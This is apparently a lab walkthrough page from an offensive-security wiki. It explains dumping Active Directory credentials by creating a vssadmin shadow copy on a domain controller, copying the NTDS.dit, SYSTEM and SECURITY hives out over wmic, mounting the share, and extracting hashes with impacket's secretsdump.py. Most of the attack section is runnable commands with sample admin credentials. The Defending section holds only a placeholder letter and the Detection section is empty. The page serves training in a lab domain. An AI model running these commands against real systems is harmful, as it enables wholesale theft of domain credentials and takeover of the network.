# Vssadmin Shadow Copy

## Configuring

No need to configure anything.

## Attacking

### How it works

With Domain Admin credentials it is possible to copy the NTDS.dit, SYSTEM and SECURITY hives remotely from the Domain Controller.

### Tools

* [Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)

### Executing the attack

The attack requires Domain Admin credentials and is a post exploitation attack to extract credentials.

1. Login to `WS01` as a normal user. For example `Richard` and the password `Sample123`.
2. Open PowerShell and Execute the following command to create a shadowcopy of the C: disk with the vssadmin utility.

```
wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```

![](<../../../.gitbook/assets/image (15).png>)

3\. Now we can copy the NTDS.dit, SYSTEM and SECURITY hives to the `C:\temp` directory.

```
wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
```

![](<../../../.gitbook/assets/image (3) (2).png>)

{% hint style="info" %}
Make sure the C:\temp directory exists on the DC before executing this command!
{% endhint %}

4\. The next step is to mount the `C:\temp` directory and access the files:

```
$creds = Get-Credential
New-PSDrive -Credential $creds -Name j \\dc02\c$\temp -PSProvider FileSystem
cd \\dc02\c$\temp
```

![](<../../../.gitbook/assets/image (12) (1).png>)

![](<../../../.gitbook/assets/image (9).png>)

5\. Copy the files to your Kali and execute the following command to extract the credentials.

```
python3 /opt/impacket/examples/secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
```

![](<../../../.gitbook/assets/image (11).png>)

![](<../../../.gitbook/assets/image (14).png>)



## Defending

### Recommendations

* a

### Detection



## References

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin" %}
